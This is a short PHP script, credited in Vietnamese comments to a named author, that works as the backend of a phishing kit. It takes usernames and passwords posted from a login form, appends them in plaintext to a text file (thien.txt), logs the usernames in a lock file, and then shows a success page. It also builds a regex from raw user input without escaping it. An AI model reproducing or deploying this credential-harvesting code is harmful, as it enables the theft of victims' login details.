<!-- Nông Văn Nguyên
Facebook.com/778578204  -->


<!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->


<?php


$username = $_POST['user'];
$password = $_POST['pass'];
// Code by Nông Văn Nguyên
if($username == "" && $password == ""){
header("Location: index.php");
}
?>

<?php function emailValid($string) { 
        if (preg_match ("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+\.[A-Za-z]{2,6}$/", $string)) {
            return true;
        }
    }

      if(!preg_match('/'.$username.'/', file_get_contents('admin/uyuuuuusdsoia09s.txt'))){
        $file = fopen('thien.txt','a');
        fwrite($file,$username.'/'.$password.PHP_EOL);
        fclose($file);
        fwrite(fopen('lock.txt','a'),$username."\n");
        fclose(fopen('lock.txt','a'));
        }
        Echo  ' ';   

?>

<!-- Nông Văn Nguyên
Facebook.com/778578204  -->


<!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->

<?php
include 'success.php';
?>